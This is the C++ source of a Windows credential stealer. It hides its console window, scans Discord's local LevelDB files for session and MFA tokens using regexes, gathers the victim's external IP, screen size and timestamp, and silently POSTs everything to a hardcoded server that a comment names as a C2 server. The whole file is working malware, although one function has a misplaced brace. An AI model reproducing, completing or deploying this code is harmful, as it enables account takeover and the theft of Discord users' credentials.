#include <windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <memory>
#include <algorithm>
#include <regex>
#include <filesystem>
#include <wininet.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <wbemidl.h>
#include <comdef.h>
#include <oleauto.h>
#include <winreg.h>
#include <winhttp.h>
#include <urlmon.h>
#include <shellapi.h>
#include <lmcons.h>
#include <iphlpapi.h>
#include <winsock2.h>
#include <ws2tcpip.h>

// Link required libraries
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "crypt32.lib")

#include "nlohmann/json.hpp"

namespace fs = std::filesystem;
using json = nlohmann::json;

// --- Data Structures ---

struct PcData {
    std::string* user;
    std::string screenSize;
    std::string dateTime;
    std::string ipAddress;
    std::vector<std::string>* discordTokens;

    json to_json() const {
        json j = {
            {"screenSize", screenSize},
            {"dateTime", dateTime},
            {"ipAddress", ipAddress}
        };

        if (user) j["user"] = *user;
        if (discordTokens) {
            j["discordTokens"] = *discordTokens;
        }

        return j;
    }
};

// --- Utility Functions ---

std::string get_current_date_time() {
    auto now = std::chrono::system_clock::now();
    auto time_t = std::chrono::system_clock::to_time_t(now);
    std::stringstream ss;
    ss << std::put_time(std::localtime(&time_t), "%Y-%m-%d %H:%M:%S");
    return ss.str();
}

void hide_console_window() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
}

std::string get_external_ip_address() {
    // Try multiple services to get external IP
    std::vector<std::string> ipServices = {
        "https://api.ipify.org",
        "https://ipv4.icanhazip.com",
        "https://checkip.amazonaws.com"
    };

    for (const auto& service : ipServices) {
        try {
            // Initialize WinHTTP
            HINTERNET hSession = WinHttpOpen(L"DataCollector/1.0",
                                           WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                           WINHTTP_NO_PROXY_NAME,
                                           WINHTTP_NO_PROXY_BYPASS,
                                           0);
            if (!hSession) continue;

            // Parse URL
            URL_COMPONENTS urlComp = { sizeof(URL_COMPONENTS) };
            urlComp.dwSchemeLength = -1;
            urlComp.dwHostNameLength = -1;
            urlComp.dwUrlPathLength = -1;
            urlComp.dwExtraInfoLength = -1;

            std::wstring wideUrl(service.begin(), service.end());
            if (!WinHttpCrackUrl(wideUrl.c_str(), 0, 0, &urlComp)) {
                WinHttpCloseHandle(hSession);
                continue;
            }

            std::wstring hostName(urlComp.lpszHostName, urlComp.dwHostNameLength);
            std::wstring urlPath(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);

            // Connect
            HINTERNET hConnect = WinHttpConnect(hSession, hostName.c_str(),
                                              urlComp.nPort, 0);
            if (!hConnect) {
                WinHttpCloseHandle(hSession);
                continue;
            }

            // Create request
            HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", urlPath.c_str(),
                                                   nullptr, WINHTTP_NO_REFERER,
                                                   WINHTTP_DEFAULT_ACCEPT_TYPES,
                                                   urlComp.nScheme == INTERNET_SCHEME_HTTPS ?
                                                   WINHTTP_FLAG_SECURE : 0);
            if (!hRequest) {
                WinHttpCloseHandle(hConnect);
                WinHttpCloseHandle(hSession);
                continue;
            }

            // Set timeout
            DWORD timeout = 5000; // 5 seconds
            WinHttpSetTimeouts(hRequest, timeout, timeout, timeout, timeout);

            // Send request
            if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                  WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
                WinHttpCloseHandle(hRequest);
                WinHttpCloseHandle(hConnect);
                WinHttpCloseHandle(hSession);
                continue;
            }

            // Receive response
            if (!WinHttpReceiveResponse(hRequest, nullptr)) {
                WinHttpCloseHandle(hRequest);
                WinHttpCloseHandle(hConnect);
                WinHttpCloseHandle(hSession);
                continue;
            }

            // Check status code
            DWORD dwStatusCode = 0;
            DWORD dwSize = sizeof(dwStatusCode);
            WinHttpQueryHeaders(hRequest,
                              WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                              nullptr, &dwStatusCode, &dwSize, nullptr);

            if (dwStatusCode != 200) {
                WinHttpCloseHandle(hRequest);
                WinHttpCloseHandle(hConnect);
                WinHttpCloseHandle(hSession);
                continue;
            }

            // Read response data
            std::string ipAddress;
            DWORD dwDownloaded = 0;
            char buffer[4096];

            do {
                if (!WinHttpReadData(hRequest, buffer, sizeof(buffer), &dwDownloaded)) {
                    break;
                }
                if (dwDownloaded > 0) {
                    ipAddress.append(buffer, dwDownloaded);
                }
            } while (dwDownloaded > 0);

            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);

            // Clean up the IP address (remove whitespace)
            ipAddress.erase(ipAddress.begin(),
                           std::find_if(ipAddress.begin(), ipAddress.end(),
                                       [](unsigned char ch) { return !std::isspace(ch); }));
            ipAddress.erase(std::find_if(ipAddress.rbegin(), ipAddress.rend(),
                                       [](unsigned char ch) { return !std::isspace(ch); }).base(),
                           ipAddress.end());

            // Validate IP address format
            if (!ipAddress.empty() && ipAddress != "127.0.0.1" && ipAddress.find('.') != std::string::npos) {
                return ipAddress;
            }

        } catch (const std::exception&) {
            continue;
        }
    }

    // Fallback
    return "127.0.0.1";
}

std::string get_screen_size() {
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    return std::to_string(width) + "x" + std::to_string(height);
}

bool send_chunk(const std::string& serverUrl, const std::string& sessionId, const PcData& pcData) {
    try {
        // Convert PcData to JSON
        json jsonBody = pcData.to_json();
        std::string jsonString = jsonBody.dump();

        // Initialize WinHTTP
        HINTERNET hSession = WinHttpOpen(L"DataCollector/1.0",
                                       WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                       WINHTTP_NO_PROXY_NAME,
                                       WINHTTP_NO_PROXY_BYPASS,
                                       0);
        if (!hSession) {
            return false;
        }

        // Parse URL
        URL_COMPONENTS urlComp = { sizeof(URL_COMPONENTS) };
        urlComp.dwSchemeLength = -1;
        urlComp.dwHostNameLength = -1;
        urlComp.dwUrlPathLength = -1;
        urlComp.dwExtraInfoLength = -1;

        std::wstring wideUrl(serverUrl.begin(), serverUrl.end());
        if (!WinHttpCrackUrl(wideUrl.c_str(), 0, 0, &urlComp)) {
            WinHttpCloseHandle(hSession);
            return false;
        }

        std::wstring hostName(urlComp.lpszHostName, urlComp.dwHostNameLength);
        std::wstring urlPath(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);

        // Connect to server
        HINTERNET hConnect = WinHttpConnect(hSession, hostName.c_str(),
                                          urlComp.nPort, 0);
        if (!hConnect) {
            WinHttpCloseHandle(hSession);
            return false;
        }

        // Create request
        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", urlPath.c_str(),
                                               nullptr, WINHTTP_NO_REFERER,
                                               WINHTTP_DEFAULT_ACCEPT_TYPES,
                                               urlComp.nScheme == INTERNET_SCHEME_HTTPS ?
                                               WINHTTP_FLAG_SECURE : 0);
        if (!hRequest) {
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return false;
        }

        // Set headers
        std::wstring sessionHeader = L"X-Session-Id: " + std::wstring(sessionId.begin(), sessionId.end());
        WinHttpAddRequestHeaders(hRequest, sessionHeader.c_str(), -1,
                               WINHTTP_ADDREQ_FLAG_ADD);
        WinHttpAddRequestHeaders(hRequest, L"Content-Type: application/json", -1,
                               WINHTTP_ADDREQ_FLAG_ADD);

        // Send request
        BOOL bResult = WinHttpSendRequest(hRequest,
                                        WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                        const_cast<char*>(jsonString.c_str()),
                                        static_cast<DWORD>(jsonString.length()),
                                        static_cast<DWORD>(jsonString.length()),
                                        0);
        if (!bResult) {
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return false;
        }

        // Receive response
        bResult = WinHttpReceiveResponse(hRequest, nullptr);
        if (bResult) {
            DWORD dwStatusCode = 0;
            DWORD dwSize = sizeof(dwStatusCode);
            WinHttpQueryHeaders(hRequest,
                              WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                              nullptr, &dwStatusCode, &dwSize, nullptr);

            // Check if status code is 2xx (success)
            bResult = (dwStatusCode >= 200 && dwStatusCode < 300);
        }

        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);

    return bResult != FALSE;
}
    } catch (const std::exception&) {
        return false;
    }
}

std::vector<std::string> extractDiscordTokens() {
    std::vector<std::string> foundTokens;
    std::string userHome = std::getenv("USERPROFILE") ? std::getenv("USERPROFILE") : "";

    // Discord installation paths to check (stable, Canary, PTB)
    std::vector<std::string> discordBasePaths = {
        userHome + "\\AppData\\Roaming\\Discord",
        userHome + "\\AppData\\Roaming\\discordcanary",
        userHome + "\\AppData\\Roaming\\discordptb"
    };

    // Token patterns
    std::vector<std::regex> tokenPatterns = {
        std::regex("mfa\\.[A-Za-z0-9_-]{84,}"), // MFA token
        std::regex("[A-Za-z0-9_-]{24,26}\\.[A-Za-z0-9_-]{6}\\.[A-Za-z0-9_-]{25,110}") // Standard token
    };

    for (const auto& discordBasePath : discordBasePaths) {
        std::string leveldbPath = discordBasePath + "\\Local Storage\\leveldb";

        if (!fs::exists(leveldbPath)) continue;

        try {
            for (const auto& entry : fs::directory_iterator(leveldbPath)) {
                if (!entry.is_regular_file()) continue;

                std::string extension = entry.path().extension().string();
                if (extension != ".log" && extension != ".ldb") continue;

                std::ifstream file(entry.path(), std::ios::binary);
                if (!file) continue;

                std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());

                for (const auto& pattern : tokenPatterns) {
                    std::smatch match;
                    std::string::const_iterator searchStart(content.cbegin());
                    while (std::regex_search(searchStart, content.cend(), match, pattern)) {
                        std::string token = match[0];
                        // Basic validation
                        if (token.length() > 50) {
                            foundTokens.push_back(token);
                        }
                        searchStart = match.suffix().first;
                    }
                }
            }
        } catch (const std::exception&) {
            continue;
        }
    }

    // Remove duplicates
    std::sort(foundTokens.begin(), foundTokens.end());
    foundTokens.erase(std::unique(foundTokens.begin(), foundTokens.end()), foundTokens.end());

    return foundTokens;
}

// --- Main Function ---
int main() {
    // Hide console window immediately on startup
    hide_console_window();

    // Get user identifier from environment variable or default to "west"
    std::string user = "west"; // Default
    char* envUser = std::getenv("CLIENT_USER");
    if (envUser) user = envUser;

    // Generate unique session ID for this collection run
    std::srand(static_cast<unsigned int>(std::time(nullptr)));
    std::string sessionId = "session-" + std::to_string(std::chrono::system_clock::now().time_since_epoch().count()) +
                           "-" + std::to_string(rand() % 9000 + 1000);
    std::string dateTime = get_current_date_time();
    std::string ipAddress = get_external_ip_address();
    std::string screenSize = get_screen_size();

    // Server URL - C2 server
    std::string serverUrl = "http://62.60.179.121/api/upload";
    char* envUrl = std::getenv("WEBPANEL_URL");
    if (envUrl) serverUrl = envUrl;

    try {
        // Get Discord tokens and send them
        std::vector<std::string> discordTokens = extractDiscordTokens();
        if (!discordTokens.empty()) {
            send_chunk(serverUrl, sessionId, PcData{
                &user,
                screenSize,
                dateTime,
                ipAddress,
                &discordTokens
            });
        }

    } catch (const std::exception&) {
        // Silent failure
    }

    return 0;
}
